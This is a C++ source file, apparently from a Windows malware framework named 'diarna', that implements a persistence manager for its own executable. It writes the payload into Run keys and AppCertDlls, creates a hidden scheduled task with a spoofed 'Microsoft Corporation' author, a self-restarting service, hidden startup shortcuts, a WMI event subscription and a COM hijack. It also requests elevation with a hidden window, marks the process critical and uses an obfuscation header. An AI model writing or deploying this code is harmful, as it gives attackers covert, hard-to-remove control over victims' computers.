#include <diarna/compiler_port.hpp>
#include <diarna/persistence/manager.hpp>
#include <shlobj.h>
#include <taskschd.h>
#include <wbemidl.h>
#include <comdef.h>
#include <objbase.h>
#include <shobjidl.h>

#include <obfuscation/obfusheader.h>
DIARNA_LINK_LIB("taskschd.lib")
DIARNA_LINK_LIB("wbemuuid.lib")
DIARNA_LINK_LIB("ole32.lib")
DIARNA_LINK_LIB("oleaut32.lib")
DIARNA_LINK_LIB("shell32.lib")
DIARNA_LINK_LIB("advapi32.lib")

namespace diarna::persistence {

static std::wstring get_exe_path() {
    wchar_t buf[MAX_PATH];
    GetModuleFileNameW(nullptr, buf, MAX_PATH);
    return buf;
}

PersistenceManager::PersistenceManager(const PersistenceConfig& config)
    : config_(config), payload_path_(get_exe_path()) {}
PersistenceManager::~PersistenceManager() = default;

bool PersistenceManager::install() { return install(Method::All); }
bool PersistenceManager::uninstall() { return uninstall(Method::All); }

bool PersistenceManager::install(Method method) {
    INDIRECT_BRANCH;
    bool ok = true;
    if (method == Method::All || method == Method::RegistryRun)
        if (config_.registry_run) ok &= install_registry();
    if (method == Method::All || method == Method::ScheduledTask)
        if (config_.scheduled_task) ok &= install_scheduled_task();
    if (method == Method::All || method == Method::WindowsService)
        if (config_.windows_service) ok &= install_service();
    if (method == Method::All || method == Method::StartupFolder)
        if (config_.startup_folder) ok &= install_startup();
    if (method == Method::All || method == Method::WmiSubscription)
        if (config_.wmi_subscription) ok &= install_wmi();
    if (method == Method::All || method == Method::ComHijack)
        if (config_.com_hijack) ok &= install_com_hijack();
    return ok;
}

bool PersistenceManager::uninstall(Method method) {
    bool ok = true;
    if (method == Method::All || method == Method::RegistryRun) ok &= uninstall_registry();
    if (method == Method::All || method == Method::ScheduledTask) ok &= uninstall_scheduled_task();
    if (method == Method::All || method == Method::WindowsService) ok &= uninstall_service();
    if (method == Method::All || method == Method::StartupFolder) ok &= uninstall_startup();
    if (method == Method::All || method == Method::WmiSubscription) ok &= uninstall_wmi();
    if (method == Method::All || method == Method::ComHijack) ok &= uninstall_com_hijack();
    return ok;
}

bool PersistenceManager::is_installed(Method method) const {
    switch (method) {
        case Method::RegistryRun: return registry::exists_run_key(config_.registry_key);
        case Method::ScheduledTask: return scheduled_task::exists(config_.task_name);
        case Method::WindowsService: return service::exists(config_.service_name);
        case Method::StartupFolder: {
            std::wstring p = std::wstring() + L""; SHGetFolderPathW(nullptr, CSIDL_STARTUP, nullptr, 0, (wchar_t*)p.data());
            wchar_t buf[MAX_PATH]; SHGetFolderPathW(nullptr, CSIDL_STARTUP, nullptr, 0, buf);
            return GetFileAttributesW((std::wstring(buf) + L"\\" + config_.task_name + L".lnk").c_str()) != INVALID_FILE_ATTRIBUTES;
        }
        default: return false;
    }
}

bool PersistenceManager::elevate_and_install() {
    BOOL elevated = FALSE; HANDLE tok; OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok);
    TOKEN_ELEVATION elev; DWORD sz = sizeof(elev);
    GetTokenInformation(tok, TokenElevation, &elev, sz, &sz); CloseHandle(tok);
    if (elev.TokenIsElevated) return install();
    SHELLEXECUTEINFOW sei = {sizeof(sei)};
    wchar_t exe[MAX_PATH]; GetModuleFileNameW(nullptr, exe, MAX_PATH);
    sei.fMask = SEE_MASK_NOCLOSEPROCESS; sei.lpVerb = L"runas";
    sei.lpFile = exe; sei.nShow = SW_HIDE;
    if (!ShellExecuteExW(&sei)) return false;
    WaitForSingleObject(sei.hProcess, 30000); CloseHandle(sei.hProcess);
    return true;
}

bool PersistenceManager::guard_process() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    auto RtlSetProcessIsCritical = reinterpret_cast<NTSTATUS(NTAPI*)(BOOLEAN, PBOOLEAN, BOOLEAN)>(
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlSetProcessIsCritical"));
    BOOLEAN was = FALSE;
    RtlSetProcessIsCritical(TRUE, &was, FALSE);
    if (config_.hide_taskmgr) {
        auto NtSetInfo = reinterpret_cast<NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG)>(
            GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess"));
        ULONG bot = 1;
        NtSetInfo(GetCurrentProcess(), 0x1D, &bot, sizeof(bot));
    }
    return true;
}

// Registry
bool PersistenceManager::install_registry() {
    bool ok = registry::create_run_key_hklm(config_.registry_key, payload_path_);
    if (!ok) ok = registry::create_run_key(config_.registry_key, payload_path_);

    HKEY k;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls",
        0, nullptr, 0, KEY_SET_VALUE, nullptr, &k, nullptr) == ERROR_SUCCESS) {
        RegSetValueExW(k, config_.task_name.c_str(), 0, REG_SZ,
            (BYTE*)payload_path_.c_str(), (DWORD)((payload_path_.size()+1)*sizeof(wchar_t)));
        RegCloseKey(k); ok = true;
    }
    return ok;
}
bool PersistenceManager::uninstall_registry() {
    bool ok = registry::delete_run_key(config_.registry_key);
    HKEY k1, k2;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls",
        0, KEY_SET_VALUE, &k1) == ERROR_SUCCESS) {
        RegDeleteValueW(k1, config_.task_name.c_str()); RegCloseKey(k1);
    }
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
        0, KEY_SET_VALUE, &k2) == ERROR_SUCCESS) {
        RegDeleteValueW(k2, L"AppInit_DLLs"); RegCloseKey(k2);
    }
    return ok;
}

// Scheduled Task
bool PersistenceManager::install_scheduled_task() {
    return scheduled_task::create(config_.task_name, payload_path_);
}
bool PersistenceManager::uninstall_scheduled_task() { return scheduled_task::delete_task(config_.task_name); }

// Service
bool PersistenceManager::install_service() {
    if (!service::create(config_.service_name, config_.service_display, payload_path_)) return false;
    service::set_failure_action(config_.service_name);
    return true;
}
bool PersistenceManager::uninstall_service() { return service::delete_service(config_.service_name); }

// Startup
bool PersistenceManager::install_startup() {
    return startup_folder::create_link_all_users(config_.task_name + L".lnk", payload_path_) ||
           startup_folder::create_link(config_.task_name + L".lnk", payload_path_);
}
bool PersistenceManager::uninstall_startup() { return startup_folder::remove(config_.task_name + L".lnk"); }

// WMI
bool PersistenceManager::install_wmi() {
    return wmi::subscribe(L"WMI_" + config_.task_name,
        L"cmd.exe /c \"" + payload_path_ + L"\"",
        L"SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process'");
}
bool PersistenceManager::uninstall_wmi() { return wmi::remove(L"WMI_" + config_.task_name); }

// COM Hijack
bool PersistenceManager::install_com_hijack() {
    auto missing = com_hijack::find_missing_clsid();
    if (missing.empty()) return false;
    return com_hijack::hijack_clsid(missing[0], payload_path_);
}
bool PersistenceManager::uninstall_com_hijack() {
    auto missing = com_hijack::find_missing_clsid();
    if (missing.empty()) return false;
    return com_hijack::restore_clsid(missing[0]);
}

// ====== REGISTRY ======
namespace registry {
bool create_run_key(const std::wstring& name, const std::wstring& path) {
    HKEY k;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &k) != ERROR_SUCCESS) return false;
    LSTATUS s = RegSetValueExW(k, name.c_str(), 0, REG_SZ, (BYTE*)path.c_str(),
        (DWORD)((path.size()+1)*sizeof(wchar_t)));
    RegCloseKey(k); return s == ERROR_SUCCESS;
}
bool create_run_key_hklm(const std::wstring& name, const std::wstring& path) {
    HKEY k;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &k) != ERROR_SUCCESS) return false;
    LSTATUS s = RegSetValueExW(k, name.c_str(), 0, REG_SZ, (BYTE*)path.c_str(),
        (DWORD)((path.size()+1)*sizeof(wchar_t)));
    RegCloseKey(k); return s == ERROR_SUCCESS;
}
bool delete_run_key(const std::wstring& name) {
    HKEY k;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &k) != ERROR_SUCCESS) return false;
    RegDeleteValueW(k, name.c_str()); RegCloseKey(k);
    HKEY k2;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &k2) == ERROR_SUCCESS) { RegDeleteValueW(k2, name.c_str()); RegCloseKey(k2); }
    return true;
}
bool exists_run_key(const std::wstring& name) {
    HKEY k; DWORD sz = 0;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_READ, &k) == ERROR_SUCCESS) {
        if (RegQueryValueExW(k, name.c_str(), nullptr, nullptr, nullptr, &sz) == ERROR_SUCCESS) { RegCloseKey(k); return true; }
        RegCloseKey(k);
    }
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_READ, &k) == ERROR_SUCCESS) {
        if (RegQueryValueExW(k, name.c_str(), nullptr, nullptr, nullptr, &sz) == ERROR_SUCCESS) { RegCloseKey(k); return true; }
        RegCloseKey(k);
    }
    return false;
}
}

// ====== SCHEDULED TASK ======
namespace scheduled_task {
bool create(const std::wstring& name, const std::wstring& path,
            const std::wstring& args, bool hidden, bool highest, const std::wstring& trigger) {
    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) return false;
    ITaskService* svc = nullptr;
    hr = CoCreateInstance(CLSID_TaskScheduler, nullptr, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&svc);
    if (FAILED(hr)) { CoUninitialize(); return false; }
    svc->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    ITaskFolder* root = nullptr; svc->GetFolder(_bstr_t(L"\\"), &root);
    root->DeleteTask(_bstr_t(name.c_str()), 0);
    ITaskDefinition* td = nullptr; svc->NewTask(0, &td);
    IRegistrationInfo* ri = nullptr; td->get_RegistrationInfo(&ri);
    ri->put_Author(_bstr_t(L"Microsoft Corporation")); ri->Release();
    ITaskSettings* ts = nullptr; td->get_Settings(&ts);
    ts->put_Hidden(hidden ? VARIANT_TRUE : VARIANT_FALSE);
    ts->put_StartWhenAvailable(VARIANT_TRUE); ts->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
    ts->put_StopIfGoingOnBatteries(VARIANT_FALSE); ts->put_AllowDemandStart(VARIANT_TRUE);
    ts->put_ExecutionTimeLimit(_bstr_t(L"PT0S")); ts->Release();
    IPrincipal* pr = nullptr; td->get_Principal(&pr);
    pr->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
    pr->put_RunLevel(highest ? TASK_RUNLEVEL_HIGHEST : TASK_RUNLEVEL_LUA); pr->Release();
    ITriggerCollection* tc = nullptr; td->get_Triggers(&tc);
    ITrigger* tro = nullptr;
    if (trigger == L"logon") tc->Create(TASK_TRIGGER_LOGON, &tro);
    else if (trigger == L"boot") tc->Create(TASK_TRIGGER_BOOT, &tro);
    else if (trigger == L"idle") tc->Create(TASK_TRIGGER_IDLE, &tro);
    else tc->Create(TASK_TRIGGER_DAILY, &tro);
    if (tro) tro->Release();
    IActionCollection* ac = nullptr; td->get_Actions(&ac);
    IAction* act = nullptr; ac->Create(TASK_ACTION_EXEC, &act);
    IExecAction* ea = nullptr; act->QueryInterface(IID_IExecAction, (void**)&ea);
    ea->put_Path(_bstr_t(path.c_str()));
    if (!args.empty()) ea->put_Arguments(_bstr_t(args.c_str()));
    ea->Release(); act->Release(); ac->Release(); tc->Release();
    IRegisteredTask* rt = nullptr;
    hr = root->RegisterTaskDefinition(_bstr_t(name.c_str()), td, TASK_CREATE_OR_UPDATE,
        _variant_t(), _variant_t(), TASK_LOGON_INTERACTIVE_TOKEN, _variant_t(L""), &rt);
    if (rt) rt->Release(); td->Release(); root->Release(); svc->Release(); CoUninitialize();
    return SUCCEEDED(hr);
}
bool delete_task(const std::wstring& name) {
    CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    ITaskService* svc = nullptr;
    CoCreateInstance(CLSID_TaskScheduler, nullptr, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&svc);
    if (!svc) { CoUninitialize(); return false; }
    svc->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    ITaskFolder* root = nullptr; svc->GetFolder(_bstr_t(L"\\"), &root);
    HRESULT hr = root->DeleteTask(_bstr_t(name.c_str()), 0);
    root->Release(); svc->Release(); CoUninitialize();
    return SUCCEEDED(hr);
}
bool exists(const std::wstring& name) {
    CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    ITaskService* svc = nullptr;
    CoCreateInstance(CLSID_TaskScheduler, nullptr, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&svc);
    if (!svc) { CoUninitialize(); return false; }
    svc->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    ITaskFolder* root = nullptr; svc->GetFolder(_bstr_t(L"\\"), &root);
    IRegisteredTask* rt = nullptr; HRESULT hr = root->GetTask(_bstr_t(name.c_str()), &rt);
    if (rt) rt->Release(); root->Release(); svc->Release(); CoUninitialize();
    return SUCCEEDED(hr);
}
}

// ====== SERVICE ======
namespace service {
bool create(const std::wstring& name, const std::wstring& display,
            const std::wstring& path, const std::wstring& args, uint32_t start_type) {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (!scm) return false;
    std::wstring bin = L"\"" + path + L"\"";
    if (!args.empty()) bin += L" " + args;
    SC_HANDLE svc = CreateServiceW(scm, name.c_str(), display.c_str(),
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, start_type,
        SERVICE_ERROR_RESTART, bin.c_str(), nullptr, nullptr, nullptr, nullptr, nullptr);
    if (!svc) { CloseServiceHandle(scm); return false; }
    SERVICE_DESCRIPTIONW sd; sd.lpDescription = (LPWSTR)display.c_str();
    ChangeServiceConfig2W(svc, SERVICE_CONFIG_DESCRIPTION, &sd);
    CloseServiceHandle(svc); CloseServiceHandle(scm);
    return true;
}
bool delete_service(const std::wstring& name) {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!scm) return false;
    SC_HANDLE svc = OpenServiceW(scm, name.c_str(), DELETE | SERVICE_STOP);
    if (!svc) { CloseServiceHandle(scm); return false; }
    SERVICE_STATUS st; ControlService(svc, SERVICE_CONTROL_STOP, &st);
    Sleep(1000); DeleteService(svc); CloseServiceHandle(svc); CloseServiceHandle(scm);
    return true;
}
bool exists(const std::wstring& name) {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) return false;
    SC_HANDLE svc = OpenServiceW(scm, name.c_str(), SERVICE_QUERY_STATUS);
    if (svc) { CloseServiceHandle(svc); CloseServiceHandle(scm); return true; }
    CloseServiceHandle(scm); return false;
}
bool set_failure_action(const std::wstring& name) {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) return false;
    SC_HANDLE svc = OpenServiceW(scm, name.c_str(), SERVICE_ALL_ACCESS);
    if (!svc) { CloseServiceHandle(scm); return false; }
    SERVICE_FAILURE_ACTIONSW sfa = {};
    SC_ACTION acts[3] = {};
    sfa.dwResetPeriod = 86400; sfa.cActions = 3; sfa.lpsaActions = acts;
    acts[0].Type = SC_ACTION_RESTART; acts[0].Delay = 60000;
    acts[1].Type = SC_ACTION_RESTART; acts[1].Delay = 60000;
    acts[2].Type = SC_ACTION_RESTART; acts[2].Delay = 60000;
    ChangeServiceConfig2W(svc, SERVICE_CONFIG_FAILURE_ACTIONS, &sfa);
    CloseServiceHandle(svc); CloseServiceHandle(scm); return true;
}
}

// ====== STARTUP FOLDER ======
namespace startup_folder {
bool create_link(const std::wstring& name, const std::wstring& target, const std::wstring& args) {
    wchar_t buf[MAX_PATH]; SHGetFolderPathW(nullptr, CSIDL_STARTUP, nullptr, 0, buf);
    std::wstring path = std::wstring(buf) + L"\\" + name;
    IShellLinkW* sl = nullptr;
    CoCreateInstance(CLSID_ShellLink, nullptr, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&sl);
    if (!sl) return false;
    sl->SetPath(target.c_str()); if (!args.empty()) sl->SetArguments(args.c_str());
    sl->SetShowCmd(SW_HIDE);
    IPersistFile* pf = nullptr; sl->QueryInterface(IID_IPersistFile, (void**)&pf);
    if (!pf) { sl->Release(); return false; }
    HRESULT hr = pf->Save(path.c_str(), TRUE);
    pf->Release(); sl->Release(); return SUCCEEDED(hr);
}
bool create_link_all_users(const std::wstring& name, const std::wstring& target, const std::wstring& args) {
    wchar_t buf[MAX_PATH]; SHGetFolderPathW(nullptr, CSIDL_COMMON_STARTUP, nullptr, 0, buf);
    std::wstring path = std::wstring(buf) + L"\\" + name;
    IShellLinkW* sl = nullptr;
    CoCreateInstance(CLSID_ShellLink, nullptr, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&sl);
    if (!sl) return false;
    sl->SetPath(target.c_str()); if (!args.empty()) sl->SetArguments(args.c_str());
    sl->SetShowCmd(SW_HIDE);
    IPersistFile* pf = nullptr; sl->QueryInterface(IID_IPersistFile, (void**)&pf);
    if (!pf) { sl->Release(); return false; }
    HRESULT hr = pf->Save(path.c_str(), TRUE);
    pf->Release(); sl->Release(); return SUCCEEDED(hr);
}
bool remove(const std::wstring& name) {
    wchar_t buf[MAX_PATH], buf2[MAX_PATH];
    SHGetFolderPathW(nullptr, CSIDL_STARTUP, nullptr, 0, buf);
    SHGetFolderPathW(nullptr, CSIDL_COMMON_STARTUP, nullptr, 0, buf2);
    DeleteFileW((std::wstring(buf) + L"\\" + name).c_str());
    DeleteFileW((std::wstring(buf2) + L"\\" + name).c_str());
    return true;
}
}

// ====== WMI ======
namespace wmi {
bool subscribe(const std::wstring& name, const std::wstring& command, const std::wstring& query) {
    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    if (FAILED(hr)) return false;
    CoInitializeSecurity(nullptr, -1, nullptr, nullptr, RPC_C_AUTHN_LEVEL_DEFAULT,
        RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE, nullptr);
    IWbemLocator* loc = nullptr;
    CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (void**)&loc);
    if (!loc) { CoUninitialize(); return false; }
    IWbemServices* svc = nullptr;
    loc->ConnectServer(_bstr_t(L"ROOT\\subscription"), nullptr, nullptr, nullptr, 0, nullptr, nullptr, &svc);
    if (!svc) { loc->Release(); CoUninitialize(); return false; }
    CoSetProxyBlanket(svc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr,
        RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE);

    IWbemClassObject* fc = nullptr, *fi = nullptr;
    svc->GetObject(_bstr_t(L"__EventFilter"), 0, nullptr, &fc, nullptr);
    fc->SpawnInstance(0, &fi);
    { VARIANT v; v.vt = VT_BSTR;
      v.bstrVal = SysAllocString(name.c_str()); fi->Put(L"Name", 0, &v, 0); VariantClear(&v);
      std::wstring q = query.empty() ? L"SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process'" : query;
      v.bstrVal = SysAllocString(q.c_str()); fi->Put(L"Query", 0, &v, 0); VariantClear(&v);
      v.bstrVal = SysAllocString(L"WQL"); fi->Put(L"QueryLanguage", 0, &v, 0); VariantClear(&v); }
    svc->PutInstance(fi, WBEM_FLAG_CREATE_ONLY, nullptr, nullptr);

    IWbemClassObject* cc = nullptr, *ci = nullptr;
    svc->GetObject(_bstr_t(L"CommandLineEventConsumer"), 0, nullptr, &cc, nullptr);
    cc->SpawnInstance(0, &ci);
    { VARIANT v; v.vt = VT_BSTR;
      v.bstrVal = SysAllocString(name.c_str()); ci->Put(L"Name", 0, &v, 0); VariantClear(&v);
      v.bstrVal = SysAllocString(command.c_str()); ci->Put(L"CommandLineTemplate", 0, &v, 0); VariantClear(&v); }
    svc->PutInstance(ci, WBEM_FLAG_CREATE_ONLY, nullptr, nullptr);

    IWbemClassObject* bc = nullptr, *bi = nullptr;
    svc->GetObject(_bstr_t(L"__FilterToConsumerBinding"), 0, nullptr, &bc, nullptr);
    if (bc) { bc->SpawnInstance(0, &bi);
        if (bi) {
            VARIANT v; v.vt = VT_BSTR;
            v.bstrVal = SysAllocString((L"__EventFilter.Name=\"" + name + L"\"").c_str());
            bi->Put(L"Filter", 0, &v, 0); VariantClear(&v);
            v.bstrVal = SysAllocString((L"CommandLineEventConsumer.Name=\"" + name + L"\"").c_str());
            bi->Put(L"Consumer", 0, &v, 0); VariantClear(&v);
            svc->PutInstance(bi, WBEM_FLAG_CREATE_ONLY, nullptr, nullptr);
            bi->Release();
        } bc->Release(); }
    ci->Release(); cc->Release(); fi->Release(); fc->Release(); svc->Release(); loc->Release(); CoUninitialize();
    return true;
}
bool remove(const std::wstring& name) {
    CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    CoInitializeSecurity(nullptr, -1, nullptr, nullptr, RPC_C_AUTHN_LEVEL_DEFAULT,
        RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE, nullptr);
    IWbemLocator* loc = nullptr;
    CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (void**)&loc);
    if (!loc) { CoUninitialize(); return false; }
    IWbemServices* svc = nullptr;
    loc->ConnectServer(_bstr_t(L"ROOT\\subscription"), nullptr, nullptr, nullptr, 0, nullptr, nullptr, &svc);
    if (!svc) { loc->Release(); CoUninitialize(); return false; }
    CoSetProxyBlanket(svc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr,
        RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE);
    svc->DeleteInstance(_bstr_t((L"__FilterToConsumerBinding.Filter=\"__EventFilter.Name=\\\"" + name + L"\\\"\",Consumer=\"CommandLineEventConsumer.Name=\\\"" + name + L"\\\"\"").c_str()), 0, nullptr, nullptr);
    svc->DeleteInstance(_bstr_t((L"__EventFilter.Name=\"" + name + L"\"").c_str()), 0, nullptr, nullptr);
    svc->DeleteInstance(_bstr_t((L"CommandLineEventConsumer.Name=\"" + name + L"\"").c_str()), 0, nullptr, nullptr);
    svc->Release(); loc->Release(); CoUninitialize(); return true;
}
}

// ====== COM HIJACK ======
namespace com_hijack {
bool hijack_clsid(const std::wstring& clsid, const std::wstring& dll_path) {
    HKEY k;
    std::wstring kp = L"SOFTWARE\\Classes\\CLSID\\" + clsid + L"\\InprocServer32";
    if (RegCreateKeyExW(HKEY_CURRENT_USER, kp.c_str(), 0, nullptr, 0, KEY_SET_VALUE, nullptr, &k, nullptr) != ERROR_SUCCESS) return false;
    RegSetValueExW(k, nullptr, 0, REG_SZ, (BYTE*)dll_path.c_str(), (DWORD)((dll_path.size()+1)*sizeof(wchar_t)));
    RegSetValueExW(k, L"ThreadingModel", 0, REG_SZ, (BYTE*)L"Apartment", 20);
    RegCloseKey(k); return true;
}
bool restore_clsid(const std::wstring& clsid) {
    HKEY k;
    std::wstring kp = L"SOFTWARE\\Classes\\CLSID\\" + clsid;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, kp.c_str(), 0, DELETE | KEY_ENUMERATE_SUB_KEYS, &k) == ERROR_SUCCESS) {
        RegDeleteTreeW(k, L"InprocServer32"); RegCloseKey(k);
        RegDeleteKeyW(HKEY_CURRENT_USER, kp.c_str());
    }
    return true;
}
std::vector<std::wstring> find_missing_clsid() {
    std::vector<std::wstring> found;
    HKEY clsid_k;
    if (RegOpenKeyExW(HKEY_CLASSES_ROOT, L"CLSID", 0, KEY_READ, &clsid_k) != ERROR_SUCCESS) return found;
    wchar_t buf[256]; DWORD idx = 0;
    while (RegEnumKeyW(clsid_k, idx++, buf, 256) == ERROR_SUCCESS && found.size() < 10) {
        std::wstring c(buf);
        HKEY sub;
        std::wstring sp = c + L"\\InprocServer32";
        if (RegOpenKeyExW(HKEY_CLASSES_ROOT, sp.c_str(), 0, KEY_READ, &sub) == ERROR_SUCCESS) {
            wchar_t dll[MAX_PATH]={}; DWORD s = sizeof(dll);
            if (RegQueryValueExW(sub, nullptr, nullptr, nullptr, (LPBYTE)dll, &s) == ERROR_SUCCESS) {
                if (GetFileAttributesW(dll) == INVALID_FILE_ATTRIBUTES) found.push_back(c);
            }
            RegCloseKey(sub);
        }
    }
    RegCloseKey(clsid_k); return found;
}
}

} // namespace diarna::persistence
